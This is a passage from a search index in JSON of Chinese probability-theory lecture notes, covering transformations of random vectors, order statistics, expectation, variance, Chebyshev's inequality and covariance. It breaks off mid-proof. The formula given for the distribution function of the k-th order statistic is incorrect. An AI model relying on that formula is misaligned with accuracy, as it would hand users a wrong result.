<p>\u4ee4 \\(\\alpha, \\beta &gt; 0\\)\uff0c\u5b9a\u4e49</p> \\[ \\Gamma(\\alpha) = \\int_{0}^{\\infty}x^{\\alpha - 1}e^{-x}\\text{d}x \\] <p>\\(\\Gamma(n) = (n - 1)!, \\Gamma(\\alpha + 1) = \\alpha\\Gamma(\\alpha)\\)</p> <p>\u5206\u5e03\u5bc6\u5ea6\u51fd\u6570</p> \\[ p(x; \\alpha, \\beta) = \\frac{\\beta^\\alpha}{\\Gamma(\\alpha)}x^{\\alpha - 1}e^{-\\beta x}, \\quad x &gt; 0 \\]"},{"location":"math/prob_theory/chapter2/#_16","title":"\u968f\u673a\u5411\u91cf\u7684\u4e58\u9664","text":"<ul> <li> <p>\u4e58\u6cd5</p> <p>\u5047\u8bbe \\((X,Y)\\) \u662f\u8fde\u7eed\u578b\u968f\u673a\u5411\u91cf\uff0c\\(Z = XY\\)\uff0c\u5219</p> \\[ \\begin{align*} F_Z(z) =&amp; P(XY \\leq z) \\\\     =&amp; \\int_{xy \\leq z}p(x, y)\\text{d}x\\text{d}y \\\\     =&amp; \\int_{-\\infty}^{0}\\text{d}x\\int_{z/x}^{\\infty}p(x, y)\\text{d}y + \\int_{0}^{\\infty}\\text{d}x\\int_{-\\infty}^{z/x}p(x, y)\\text{d}y \\\\     =&amp; -\\int_{-\\infty}^{0}\\text{d}x\\int_{-\\infty}^{z}\\frac{1}{x}p(x, \\frac{y}{x})\\text{d}y + \\int_{0}^{\\infty}\\text{d}x\\int_{-\\infty}^{z}\\frac{1}{x}p(x, \\frac{y}{x})\\text{d}y \\\\     =&amp; -\\int_{-\\infty}^{z}\\int_{-\\infty}^{0}\\frac{1}{x}p(x, \\frac{y}{x})\\text{d}x\\text{d}y + \\int_{-\\infty}^{z}\\int_{0}^{\\infty}\\frac{1}{x}p(x, \\frac{y}{x})\\text{d}x\\text{d}y \\end{align*} \\] <p>\u5bc6\u5ea6\u51fd\u6570</p> \\[ \\begin{align*} p_Z(z) =&amp; -\\int_{-\\infty}^{0}\\frac{1}{x}p(x, \\frac{z}{x})\\text{d}x + \\int_{0}^{\\infty}\\frac{1}{x}p(x, \\frac{z}{x})\\text{d}x \\\\     =&amp; \\int_{-\\infty}^{\\infty}\\frac{1}{|x|}p(x, \\frac{z}{x})\\text{d}x \\end{align*} \\] </li> <li> <p>\u9664\u6cd5</p> <p>\\(Z = \\frac{Y}{X}\\) \u7684\u5bc6\u5ea6\u51fd\u6570</p> \\[ p_Z(z) = \\int_{-\\infty}^{\\infty}|x|p(x, xz)\\text{d}x \\] </li> </ul> <p>Cauchy \u5206\u5e03</p> \\[ p(x; x_0, \\gamma) = \\frac{1}{\\pi}\\frac{\\gamma}{(x - x_0)^2 + \\gamma^2} \\]"},{"location":"math/prob_theory/chapter2/#_17","title":"\u968f\u673a\u5411\u91cf\u7684\u53d8\u6362","text":"<p>\\((X, Y)\\) \u4e3a\u8fde\u7eed\u578b\u968f\u673a\u5411\u91cf\uff0c\u6709\u8054\u5408\u5bc6\u5ea6\u51fd\u6570 \\(p_{XY}(x, y)\\)\uff0c\u53d8\u6362\u5982\u4e0b</p> \\[ \\begin{cases} U = f_1(X, Y) \\\\ V = f_2(X, Y) \\end{cases} \\] <ul> <li> <p>\u57fa\u672c\u65b9\u6cd5</p> \\[ \\begin{align*} P(U \\leq u, V \\leq v) =&amp; P(f_1(X, Y) \\leq u, f_2(X, Y) \\leq v) \\\\     =&amp; \\iint_{f_1(x, y) \\leq u, f_2(x, y) \\leq v}p_{XY}(x, y)\\text{d}x\\text{d}y \\end{align*} \\] </li> <li> <p>\u7279\u6b8a\u60c5\u5f62</p> <p>\u5047\u8bbe \\(f_1, f_2\\) \u5b58\u5728\u9006\u53d8\u6362\uff1a</p> \\[ \\begin{cases} X = g_1(u, v) \\\\ Y = g_2(u, v) \\end{cases} \\] <p>\u5047\u8bbe \\(g_1, g_2\\) \u53ef\u5fae\uff0c\u4e14\u96c5\u53ef\u6bd4\u5f0f</p> \\[ J = \\frac{\\partial(x, y)}{\\partial(u, v)} \\] <p>\u90a3\u4e48 \\((U, V)\\) \u7684\u4e3a\u8fde\u7eed\u578b\u968f\u673a\u5411\u91cf\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u4e3a</p> \\[ p_{UV}(u, v) = p_{XY}(x, y)|J| \\] </li> </ul>"},{"location":"math/prob_theory/chapter2/#_18","title":"\u6781\u503c\u968f\u673a\u53d8\u91cf","text":"<p>\\(X_1, X_2, \\cdots, X_n\\) \u662f\u72ec\u7acb\u968f\u673a\u53d8\u91cf\uff0c\u6709\u76f8\u540c\u7684\u5206\u5e03\u51fd\u6570 \\(F(x)\\)\uff0c\u8bb0</p> \\[ X_{(1)} \\leq X_{(2)} \\leq \\cdots \\leq X_{(n)} \\] <p>\u5373 \\(X_{(k)}\\) \u4e3a\u7b2c k \u5c0f\u503c\u3002\\(X_{(1)} = \\min\\{X_1, X_2, \\cdots, X_n\\}\\)\uff0c\\(X_{(n)} = \\max\\{X_1, X_2, \\cdots, X_n\\}\\)\u3002</p> <ul> <li> <p>\\(X_{(n)}\\) \u7684\u5206\u5e03</p> \\[ \\begin{align*} F_{X_{(n)}}(x) =&amp; P(X_{(n)} \\leq x) \\\\     =&amp; P(X_1 \\leq x, X_2 \\leq x, \\cdots, X_n \\leq x) \\\\     =&amp; P(X_1 \\leq x)P(X_2 \\leq x)\\cdots P(X_n \\leq x) \\\\     =&amp; F^n(x) \\end{align*} \\] <p>\u5bc6\u5ea6\u51fd\u6570</p> \\[ p_{X_{(n)}}(x) = \\frac{\\text{d}F_{X_{(n)}}}{\\text{d}x} = nF^{n-1}(x)F'(x) \\] </li> <li> <p>\\(X_{(1)}\\) \u7684\u5206\u5e03</p> \\[ \\begin{align*} F_{X_{(1)}}(x) =&amp; P(X_{(1)} \\leq x) \\\\     =&amp; 1 - P(X_{(1)} &gt; x) \\\\     =&amp; 1 - P(X_1 &gt; x, X_2 &gt; x, \\cdots, X_n &gt; x) \\\\     =&amp; 1 - P(X_1 &gt; x)P(X_2 &gt; x)\\cdots P(X_n &gt; x) \\\\     =&amp; 1 - (1 - F(x))^n \\end{align*} \\] <p>\u5bc6\u5ea6\u51fd\u6570</p> \\[ p_{X_{(1)}}(x) = \\frac{\\text{d}F_{X_{(1)}}}{\\text{d}x} = n(1 - F(x))^{n-1}F'(x) \\] </li> <li> <p>\\(X_{(k)}\\) \u7684\u5206\u5e03</p> \\[ \\begin{align*} F_{X_{(k)}}(x) =&amp; P(X_{(k)} \\leq x) \\\\     =&amp; {n \\choose k} F^k(x)(1 - F(x))^{n-k} \\end{align*} \\] </li> </ul> <p>Example</p> <p>\u8bbe \\(X_1, X_2, \\cdots, X_n\\) \u76f8\u4e92\u72ec\u7acb\u4e14\u670d\u4ece \\([0, a]\\) \u4e0a\u7684\u5747\u5300\u5206\u5e03\uff0c\u6c42 \\(Y = \\max\\{X_1, X_2, \\cdots, X_n\\}, Z = \\min\\{X_1, X_2, \\cdots, X_n\\}\\) \u7684\u8054\u5408\u5206\u5e03\u3002</p> <p>\u89e3\uff1a</p> \\[ \\begin{align*} F_{YZ}(y, z) =&amp; P(Y \\leq y, Z \\leq z) \\\\     =&amp; P(Y \\leq y) - P(Y \\leq y, Z &gt; z) \\\\     =&amp; F_X^n(y) - \\prod_{i=1}^{n}P(z &lt; X_i \\leq y) \\\\     =&amp; F_X^n(y) - (F_X(y) - F_X(z))^n \\\\     =&amp; (\\frac{y}{a})^n - (\\frac{y-z}{a})^n, \\quad 0 \\leq z \\leq y \\leq a \\end{align*} \\]"},{"location":"math/prob_theory/chapter2/#_19","title":"\u603b\u7ed3","text":"<ul> <li> <p>\u4e8c\u9879 Bernoulli \u5206\u5e03</p> \\[ P(X = k) = {n \\choose k}p^k(1-p)^{n-k}, \\quad k = 0, 1, \\cdots, n \\] <p>Poisson \u5206\u5e03\uff1a</p> \\[ P(X = k) = \\frac{\\lambda^k}{k!}e^{-\\lambda}, \\quad k = 0, 1, \\cdots \\] <p>\u51e0\u4f55\u5206\u5e03\uff1a\u4e0d\u65ad\u91cd\u590d\u76f4\u5230\u4e8b\u4ef6\u53d1\u751f</p> \\[ P(X = k) = p(1-p)^{k-1}, \\quad k = 1, 2, \\cdots \\] <p>\u8d85\u51e0\u4f55\u5206\u5e03\uff1a\\(N\\) \u4ef6\u4ea7\u54c1 \\(M\\) \u4ef6\u6b21\u54c1\uff0c\u968f\u673a\u62bd\u6837 \\(n\\) \u4ef6\uff0c\\(X\\) \u8868\u793a \\(n\\) \u4ef6\u4ea7\u54c1\u4e2d\u6b21\u54c1\u6570</p> \\[ P(X = k) = \\frac{{M \\choose k}{N - M \\choose n - k}}{{N \\choose n}}, \\quad k = 0, 1, \\cdots, \\min\\{M, n\\} \\] <p>\u6307\u6570\u5206\u5e03</p> \\[ p(x) = \\begin{cases} \\lambda e^{-\\lambda x}, &amp; x\\geq 0 \\\\ 0                     , &amp; \\text{\u5176\u4ed6} \\end{cases} \\quad \\lambda &gt; 0 \\] </li> <li> <p>\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf</p> <p>\u5bc6\u5ea6\u51fd\u6570 \\(p(x)\\)\uff0c\u5206\u5e03\u51fd\u6570 \\(F(x)\\)</p> \\[ p(x) \\geq 0, \\int_{-\\infty}^{\\infty}p(x)\\text{d}x = 1 \\] \\[ F(x) = P(X \\leq x) = \\int_{-\\infty}^{x}p(u)\\text{d}u \\] </li> </ul>"},{"location":"math/prob_theory/chapter3/","title":"\u6570\u5b57\u7279\u5f81","text":""},{"location":"math/prob_theory/chapter3/#_2","title":"\u6570\u5b66\u671f\u671b","text":""},{"location":"math/prob_theory/chapter3/#_3","title":"\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf","text":"\\[ X \\sim \\begin{pmatrix}     x_1 &amp; x_2 &amp; \\cdots &amp; x_n \\\\     p_1 &amp; p_2 &amp; \\cdots &amp; p_n \\end{pmatrix} \\] <p>\u671f\u671b</p> \\[ E(X) = \\sum_{i=1}^n x_i p_i \\]"},{"location":"math/prob_theory/chapter3/#_4","title":"\u7edd\u5bf9\u53ef\u6c42\u548c","text":"<p>\u8981\u6c42</p> \\[ \\sum_{i=1}^\\infty |x_i| p_i &lt; \\infty \\] <p>\u5373 \\(E(|X|)\\) \u7edd\u5bf9\u6536\u655b\u3002</p> <p>Note</p> <p>\u6761\u4ef6 \\(E(|X|) &lt; \\infty\\) \u8868\u793a\u671f\u671b \\(\\displaystyle\\sum_{i=1}^{\\infty}x_ip_i\\) \u7684\u6c42\u548c\u4e0d\u53d7\u6c42\u548c\u987a\u5e8f\u7684\u5f71\u54cd\u3002</p> <p>\u5f53\u8fd9\u4e2a\u6761\u4ef6\u4e0d\u6ee1\u8db3\u65f6\uff0c\u671f\u671b\u4e0d\u5b58\u5728\u3002</p>"},{"location":"math/prob_theory/chapter3/#_5","title":"\u8fde\u7eed\u6027\u968f\u673a\u53d8\u91cf","text":"<p>\u8bbe \\(X \\sim p(x)\\)\uff0c\u5219 \\(X\\) \u7684\u671f\u671b\u4e3a</p> \\[ EX = \\int_{-\\infty}^{\\infty} x p(x) \\ \\mathrm{d}x \\] <p>\u5b58\u5728\u6761\u4ef6\uff1a\u7edd\u5bf9\u53ef\u79ef\uff0c\u5373</p> \\[ \\int_{-\\infty}^{\\infty} |x| p(x) \\ \\mathrm{d}x &lt; \\infty \\]"},{"location":"math/prob_theory/chapter3/#_6","title":"\u671f\u671b\u7684\u6027\u8d28","text":"<ol> <li>\\(a \\leq X \\leq b \\Rightarrow a \\leq EX \\leq b\\)</li> <li> <p>\u7ebf\u6027\u8fd0\u7b97\u3001\u52a0\u6cd5\u5b9a\u7406</p> \\[ E(aX + bY) = aEX + bEY \\] </li> </ol>"},{"location":"math/prob_theory/chapter3/#_7","title":"\u968f\u673a\u53d8\u91cf\u51fd\u6570\u7684\u6570\u5b66\u671f\u671b","text":"<p>\u8bbe \\(f: \\mathbb{R} \\rightarrow \\mathbb{R}\\) \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\\(X\\) \u662f\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u6c42 \\(Ef(X)\\)\u3002</p> <ul> <li> <p>\\(X\\) \u662f\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf</p> \\[ P(X = x_k) = p_k, k = 1, 2, \\cdots, N \\] <p>\u5219</p> \\[ Ef(X) = \\sum_{k=1}^{N} f(x_k) p_k \\] </li> <li> <p>\\(X\\) \u662f\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf</p> \\[ X \\sim p(x), -\\infty &lt; x &lt; \\infty \\] <p>\u5219</p> \\[ Ef(X) = \\int_{-\\infty}^{\\infty} f(x) p(x) \\ \\mathrm{d}x \\] </li> <li> <p>\\(X\\) \u662f\u6df7\u5408\u578b\u968f\u673a\u53d8\u91cf</p> <p>\\(X\\) \u6709\u5206\u5e03\u51fd\u6570 \\(F(x)\\)\uff0c\u5219</p> \\[ Ef(X) = \\int_{-\\infty}^{\\infty} f(x) \\ \\mathrm{d}F(x) \\] <p>\uff08\u9ece\u66fc\u79ef\u5206\uff09</p> </li> </ul>"},{"location":"math/prob_theory/chapter3/#_8","title":"\u65b9\u5dee","text":""},{"location":"math/prob_theory/chapter3/#_9","title":"\u65b9\u5dee\u7684\u5b9a\u4e49","text":"<p>\u8861\u91cf\u968f\u673a\u53d8\u91cf\u504f\u5dee\u7684\u5927\u5c0f\u3002</p> <p>\u6807\u51c6\u5dee\uff1a\\(\\sqrt{E((X - EX)^2)}\\)</p> <p>\u65b9\u5dee\uff1a\\(VarX = E((X - EX)^2)\\)</p>"},{"location":"math/prob_theory/chapter3/#_10","title":"\u65b9\u5dee\u7684\u8ba1\u7b97","text":"<p>\u516c\u5f0f\uff1a</p> \\[ VarX = E(X^2) - (EX)^2 \\]"},{"location":"math/prob_theory/chapter3/#_11","title":"\u65b9\u5dee\u7684\u6027\u8d28","text":"<ol> <li>\\(Var(X + a) = VarX\\)</li> <li>\\(Var(aX) = a^2 VarX\\)</li> <li>\\(Var(a + bX) = b^2 VarX\\)</li> <li>\\(Var(X + Y) = VarX + VarY + 2E(X - EX)(Y - EY) = VarX + VarY + 2Cov(X, Y)\\)</li> <li>\u5f53 \\(X\\) \u548c \\(Y\\) \u76f8\u4e92\u72ec\u7acb\u65f6\uff0c\\(Var(X + Y) = VarX + VarY\\)\uff0c\u72ec\u7acb\u548c\u7684\u65b9\u5dee\u7b49\u4e8e\u65b9\u5dee\u4e4b\u548c\u3002</li> <li> <p>\u5f53 \\(c \\not= EX\\) \u65f6\uff0c\\(Var(X) &lt; E((X - c)^2)\\)</p> <p>\u8bc1\u660e</p> \\[ \\begin{aligned} Var(X) &amp;= E((X - EX)^2) \\\\ &amp;= E((X - c - (EX- c))^2) \\\\ &amp;= E((X - c)^2 - 2(X - c)(EX - c) + (EX - c)^2) \\\\ &amp;= E((X - c)^2) - (EX - c)^2 \\\\ &amp;&lt; E((X - c)^2) \\end{aligned} \\] </li> <li> <p>\\(Var(\\sum_{i=1}^n X_i) = \\sum_{i=1}^n Var(X_i) + 2 \\sum_{i&lt;j} Cov(X_i, X_j)\\)</p> </li> </ol>"},{"location":"math/prob_theory/chapter3/#chebyshev","title":"Chebyshev \u4e0d\u7b49\u5f0f","text":"<p>\u8bbe \\(X\\) \u662f\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\\(\\forall \\varepsilon &gt; 0\\)\uff0c\u6709</p> \\[ P(|X - EX| &gt; \\varepsilon) \\leq \\frac{VarX}{\\varepsilon^2} \\] <p>\u8bc1\u660e</p> <p>\u8bbe \\(X \\sim p(x)\\)\uff0c\u5219</p> \\[ \\begin{aligned} P(|X - EX| &gt; \\varepsilon) &amp;= \\int_{|x-EX| &gt; \\varepsilon} p(x) \\ \\mathrm{d}x \\\\ &amp;\\leq \\int_{|x-EX| &gt; \\varepsilon} \\frac{(x - EX)^2}{\\varepsilon^2} p(x) \\ \\mathrm{d}x \\\\ &amp;\\leq \\frac{1}{\\varepsilon^2} \\int_{-\\infty}^{\\infty} (x - EX)^2 p(x) \\ \\mathrm{d}x \\\\ &amp;= \\frac{VarX}{\\varepsilon^2} \\end{aligned} \\] <p>\u63a8\u5e7f</p> <p>\u8bbe \\(f\\) \u662f\u5355\u8c03\u4e0d\u51cf\u4e25\u683c\u6b63\u51fd\u6570\uff0c\u5219</p> \\[ P(X &gt; \\varepsilon) \\leq \\frac{E(f(X))}{f(\\varepsilon)} \\] <p>\u8bc1\u660e</p> \\[ \\begin{aligned} P(X &gt; \\varepsilon) &amp;= \\int_{\\varepsilon}^{\\infty} p(x) \\ \\mathrm{d}x \\\\ &amp;\\leq \\int_{\\varepsilon}^{\\infty} \\frac{f(x)}{f(\\varepsilon)} p(x) \\ \\mathrm{d}x \\\\ &amp;= \\frac{1}{f(\\varepsilon)} \\int_{-\\infty}^{\\infty} f(x) p(x) \\ \\mathrm{d}x \\\\ &amp;= \\frac{E(f(X))}{f(\\varepsilon)} \\end{aligned} \\]"},{"location":"math/prob_theory/chapter3/#_12","title":"\u5e94\u7528","text":"<ol> <li> <p>\u8bbe \\(X \\sim N(\\mu, \\sigma^2)\\)\uff0c\u5219</p> \\[ P(|X - \\mu| &gt; 3\\sigma) \\leq \\frac{\\sigma^2}{9\\sigma^2} = \\frac{1}{9} \\] <p>\u8fd9\u79cd\u65b9\u6cd5\u4e0a\u754c\u4e0e\u771f\u5b9e\u503c\u76f8\u5dee\u5f88\u5927</p> </li> <li> <p>\u8bbe \\(S_n \\sim B(n, p)\\)\uff0c\u5176\u4e2d \\(p\\) \u672a\u77e5\uff0c\u60f3\u8981\u7528 \\(\\dfrac{S_n}{n}\\) \u6765\u4f30\u8ba1 \\(p\\)\uff0c\u5219\u8bd5\u9a8c\u6b21\u6570 \\(n\\) \u548c\u7cbe\u5ea6 \\(\\varepsilon\\) \u7684\u5927\u81f4\u5173\u7cfb\uff1a</p> \\[ \\begin{aligned} P(|\\frac{S_n}{n} - p| &gt; \\varepsilon) &amp;\\leq \\frac{Var(\\frac{S_n}{n})}{\\varepsilon^2} \\\\ &amp;= \\frac{Var(S_n)}{n^2 \\varepsilon^2} \\\\ &amp;= \\frac{p(1-p)}{n \\varepsilon^2} \\\\ &amp;\\leq \\frac{1}{4n \\varepsilon^2} \\end{aligned} \\] <p>\u6539\u8fdb</p> <p>\u4ee4 \\(f(x) = x^4\\)\uff0c\u5219</p> \\[ \\begin{aligned} P(|\\frac{S_n}{n} - p| &gt; \\varepsilon) &amp;\\leq \\frac{E(\\frac{S_n}{n} - p)^4}{\\varepsilon^4} \\\\ &amp;= \\frac{E(S_n - np)^4}{n^4 \\varepsilon^4} \\\\ &amp;\\approx \\frac{c}{n^2 \\varepsilon^4} \\end{aligned} \\] </li> <li> <p>\u5f53 \\(VarX = 0\\)\uff0c\u5219</p> \\[ P(X = EX) = 1 \\] <p>\u8bc1\u660e</p> <p>\u5373\u8bc1 \\(P(|X - EX| &gt; 0) = 0\\)\u3002</p> <p>\u5bf9\u4e8e \\(\\forall \\varepsilon &gt; 0\\)\uff0c\u6709</p> \\[ P(|X - EX| &gt; \\varepsilon) \\leq \\frac{VarX}{\\varepsilon^2} = 0 \\] <p>\u56e0\u6b64</p> \\[ \\begin{aligned} P(|X - EX| &gt; 0) &amp;= P(\\bigcup_{n=1}^{\\infty} \\{|X - EX| &gt; \\frac{1}{n}\\}) \\\\ &amp;\\leq \\sum_{n=1}^{\\infty} P(|X - EX| &gt; \\frac{1}{n}) \\\\ &amp;= 0 \\end{aligned} \\] <p>\u8bc1\u6bd5\u3002</p> </li> </ol>"},{"location":"math/prob_theory/chapter3/#_13","title":"\u534f\u65b9\u5dee","text":"<ul> <li> <p>\u5747\u503c\u5411\u91cf\uff1a\\(\\vec{\\mu} = (EX, EY)\\) \u8868\u793a\u5411\u91cf\u5747\u503c\u3002</p> </li> <li> <p>\u534f\u65b9\u5dee\uff1a\u5047\u8bbe \\(X\\) \u548c \\(Y\\) \u7684\u65b9\u5dee\u5b58\u5728\uff0c\u4ee4</p> \\[ Cov(X, Y) = E[(X - EX)(Y - EY)] \\] <p>\u8868\u793a \\(X\\) \u548c \\(Y\\) \u7684\u534f\u65b9\u5dee\u3002</p> <p>\u8ba1\u7b97\u516c\u5f0f\uff1a\\(Cov(X, Y) = EXY - EXEY\\)</p> </li> <li> <p>\u8fd0\u7b97\u6027\u8d28\uff1a</p> \\[ \\begin{aligned} Cov(aX + b, cY + d) &amp;= E[(aX + b)(cY + d)] - E(aX + b)E(cY + d) \\\\ &amp;= acE(XY) - acEXEY \\\\ &amp;= acCov(X, Y) \\end{aligned} \\] </li> </ul>"},{"location":"math/prob_theory/chapter3/#cauchy-schwarz","title":"Cauchy-Schwarz \u4e0d\u7b49\u5f0f","text":"\\[ E|X - EX||Y - EY| \\leq \\sqrt{E(X - EX)^2E(Y - EY)^2} \\] <p>\u8bc1\u660e</p> <p>\u4e0d\u59a8\u8bbe \\(EX = EY = 0\\)\uff0c\u5219\u9700\u8981\u8bc1\u660e</p> \\[ E|XY| \\leq \\sqrt{EX^2 EY^2} \\] <p>\u5bf9\u4e8e \\(\\forall t &gt; 0\\)\uff0c\u6709</p> \\[ \\begin{aligned} 0 &amp;\\leq E(|X| + t|Y|)^2 \\\\ &amp;= EX^2 + 2tE|XY| + t^2 EY^2 , \\forall t &gt; 0 \\end{aligned} \\] <p>\u5219 \\(EX^2 + 2tE|XY| + t^2 EY^2 \\geq 0\\)\uff0c\u6545</p> \\[ \\Delta = 4E^2|XY| - 4EX^2EY^2 \\leq 0 \\] <p>\u5373</p> \\[ E^2|XY| \\leq EX^2EY^2 \\Rightarrow E|XY| \\leq \\sqrt{EX^2EY^2} \\]"},{"location":"math/prob_theory/chapter3/#_14","title":"\u534f\u65b9\u5dee\u77e9\u9635","text":"<p>\u5047\u8bbe \\(X\\) \u548c \\(Y\\) \u7684\u65b9\u5dee\u5b58\u5728\uff0c\u4ee4</p> \\[ \\Sigma = \\begin{pmatrix}     VarX &amp; Cov(X, Y) \\\\     Cov(X, Y) &amp; VarY \\end{pmatrix} \\] <p>\u79f0\u4e3a \\(X\\) \u548c \\(Y\\) \u7684\u534f\u65b9\u5dee\u77e9\u9635\u3002</p>"},{"location":"math/prob_theory/chapter3/#_15","title":"\u534f\u65b9\u5dee\u77e9\u9635\u7684\u6027\u8d28","text":"<ol> <li> <p>\\(\\Sigma\\) \u975e\u8d1f\u5b9a\uff0c\u5bf9\u4e8e \\(\\forall x, y \\in \\mathbb{R}\\)\uff0c\u6709</p> \\[ (x, y) \\begin{pmatrix}     VarX &amp; Cov(X, Y) \\\\     Cov(X, Y) &amp; VarY \\end{pmatrix} \\begin{pmatrix}     x \\\\     y \\end{pmatrix} \\geq 0 \\] <p>\u8bc1\u660e</p> \\[ \\begin{aligned} (x, y) \\begin{pmatrix}     VarX &amp; Cov(X, Y) \\\\     Cov(X, Y) &amp; VarY \\end{pmatrix} \\begin{pmatrix}     x \\\\     y \\end{pmatrix} &amp;= x^2 VarX + 2xy Cov(X, Y) + y^2 VarY \\\\ &amp;= x^2 E(X - EX)^2 + 2xy E[(X - EX)(Y - EY)] + y^2 E(Y - EY)^2 \\\\ &amp;= E[x(X - EX) + y(Y - EY)]^2 \\\\ &amp;\\geq 0 \\end{aligned} \\] </li> <li> <p>\u5982\u679c \\(X,Y\\) \u72ec\u7acb\uff0c\u5219</p> \\[ Cov(X, Y) = 0 \\] <p>\u8bc1\u660e</p> \\[ \\begin{aligned} Cov(X, Y) &amp;= E[(X - EX)(Y - EY)] \\\\ &amp;= E(X - EX)E(Y - EY) \\\\ &amp;= 0 \\end{aligned} \\] </li> </ol> <p>\u5b9a\u4e49</p> <p>\u82e5</p> \\[ Cov(X, Y) = 0 \\] <p>\u5219\u79f0 \\(X\\) \u548c \\(Y\\) \u4e0d\u76f8\u5173\u3002</p> <p>\u5982\u679c \\(X\\) \u548c \\(Y\\) \u72ec\u7acb\uff0c\u5219 \\(X\\) \u548c \\(Y\\) \u4e0d\u76f8\u5173\uff0c\u4f46\u53cd\u4e4b\u4e0d\u6210\u7acb\u3002</p> <ol> <li> <p>\\(X,Y\\) \u4e0d\u76f8\u5173\u5e76\u4e0d\u610f\u5473\u7740 \\(X,Y\\) \u72ec\u7acb\u3002</p> <p>\u4f8b</p> <p>\u8bbe \\(\\theta \\sim U(0, 2\\pi)\\)\uff0c\\(X = \\cos \\theta\\)\uff0c\\(Y = \\sin \\theta\\)\uff0c\u5219</p> \\[ EX = EY = 0, VarX = VarY = \\frac{1}{2}, Cov(X, Y) = 0 \\] <p>\u4f46</p> \\[ X^2 + Y^2 \\equiv 1 \\] <p>\u56e0\u6b64 \\(X,Y\\) \u4e0d\u72ec\u7acb\u3002</p> </li> </ol> <p>\u4e8c\u5143\u8054\u5408\u6b63\u6001\u5206\u5e03</p> <p>\u8bbe \\((X,Y) \\sim N(\\mu_1, \\sigma_1^2, \\mu_2, \\sigma_2^2, \\rho)\\)\uff0c\u5219</p> \\[ Cov(X, Y) = \\rho \\sigma_1 \\sigma_2 \\]"},{"location":"math/prob_theory/chapter3/#_16","title":"\u7ebf\u6027\u53d8\u6362\u540e\u7684\u534f\u65b9\u5dee\u77e9\u9635","text":"<p>\u8bbe \\(N\\) \u7ef4\u968f\u673a\u5411\u91cf \\(\\mathbf{X} = (X_1, X_2, \\cdots, X_N)^T\\) \u670d\u4ece\u5747\u503c \\(E(\\mathbf{X}) = 0\\)\uff0c\u534f\u65b9\u5dee\u77e9\u9635\u4e3a \\(\\Sigma_{\\mathbf{X}}\\) \u7684\u6b63\u6001\u5206\u5e03\uff0c\u8bbe\u968f\u673a\u5411\u91cf</p> \\[ \\mathbf{Y} = \\mathbf{A} \\mathbf{X} \\] <p>\u5219\u968f\u673a\u5411\u91cf \\(\\mathbf{Y}\\) \u7684\u5747\u503c\u548c\u534f\u65b9\u5dee\u77e9\u9635\u6ee1\u8db3\uff1a</p> \\[ \\begin{aligned} E(\\mathbf{Y}) = \\mathbf{A} E(\\mathbf{X}) = 0 \\\\ \\Sigma_{\\mathbf{Y}} = \\mathbf{A} \\Sigma_{\\mathbf{X}} \\mathbf{A}^T \\end{aligned} \\] <p>\u8bc1\u660e</p> <p>\\(E(\\mathbf{Y}) = \\mathbf{A} E(\\mathbf{X}) = 0\\) \u663e\u7136\u3002</p> <p>\u8bbe \\(\\mathbf{A} = (a_{ij})_{N \\times N}\\)\uff0c\u5219\u5bf9\u4e8e \\(\\forall 1 \\leq i, j \\leq N\\)\uff0c\u6709</p> \\[ \\begin{aligned} Cov(Y_i, Y_j) &amp;= E((Y_i - EY_i)(Y_j - EY_j)) \\\\ &amp;= E(Y_i Y_j) \\\\ &amp;= E(\\sum_{k=1}^N a_{ik} X_k \\sum_{l=1}^N a_{jl} X_l) \\\\ &amp;= \\sum_{k=1}^N \\sum_{l=1}^N a_{ik} E(X_k X_l) a_{jl} \\end{aligned} \\] <p>\u53c8\u6709 \\(Cov(X_i, X_j) = E((X_i - EX_i)(X_j - EX_j)) = E(X_i X_j)\\)\uff0c\u56e0\u6b64</p> \\[ \\begin{aligned} Cov(Y_i, Y_j) &amp;= \\sum_{k=1}^N \\sum_{l=1}^N a_{ik} Cov(X_k, X_l) a_{jl} \\\\ &amp;= \\sum_{l=1}^N a_{jl} \\sum_{k=1}^N a_{ik} Cov(X_k, X_l) \\end{aligned} \\] <p>\u7531\u4e8e \\(\\Sigma_{\\mathbf{X}} = (Cov(X_i, X_j))_{N \\times N}, \\Sigma_{\\mathbf{Y}} = (Cov(Y_i, Y_j))_{N \\times N}\\)\uff0c\u56e0\u6b64\u53ef\u4ee5\u770b\u51fa</p> \\[ \\Sigma_{\\mathbf{Y}} = \\mathbf{A} \\Sigma_{\\mathbf{X}} \\mathbf{A}^T \\]"},{"location":"math/prob_theory/chapter3/#_17","title":"\u76f8\u5173\u7cfb\u6570","text":"<p>\u5b9a\u4e49</p> \\[ \\gamma = \\frac{Cov(X, Y)}{\\sqrt{VarX} \\sqrt{VarY}} \\] <p>\u79f0\u4e3a \\(X\\) \u548c \\(Y\\) \u7684\u76f8\u5173\u7cfb\u6570\uff0c\u53cd\u6620 \\(X\\) \u548c \\(Y\\) \u4e4b\u95f4\u7684\u76f8\u5173\u7a0b\u5ea6\u3002</p>"},{"location":"math/prob_theory/chapter3/#_18","title":"\u76f8\u5173\u7cfb\u6570\u7684\u6027\u8d28","text":"<ol> <li> <p>\u7531 Cauchy-Schwarz \u4e0d\u7b49\u5f0f\u53ef\u77e5</p> \\[ |\\gamma| \\leq 1 \\] </li> <li> <p>\u5f53 \\(\\gamma = 1\\) \u65f6\uff0c\u5b58\u5728 \\(t_0 = \\sqrt{\\dfrac{VarX}{VarY}}\\)\uff0c\u4f7f\u5f97</p> \\[ P(X = t_0(Y - EY) + EX) = 1 \\] <p>\u5373 \\(X\\) \u548c \\(Y\\) \u662f\u6b63\u7ebf\u6027\u76f8\u5173\u7684\u3002</p> <p>\u8bc1\u660e</p> <p>\u5373\u8bc1 \\(X - EX - t_0(Y - EY) = 0\\)\u3002</p> <p>\u7531 \\(\\gamma = 1\\) \u53ef\u77e5</p> \\[ Cov(X, Y) = \\sqrt{VarX} \\sqrt{VarY} \\] <p>\u53d6 \\(t_0 = \\sqrt{\\dfrac{VarX}{VarY}}\\)\uff0c\u6709</p> \\[ \\begin{aligned} E(X - EX - t_0(Y - EY))^2 &amp;= E(X - EX)^2 + t_0^2 E(Y - EY)^2 - 2t_0 E(X - EX)(Y - EY) \\\\ &amp;= VarX + t_0^2 VarY - 2t_0 Cov(X, Y) 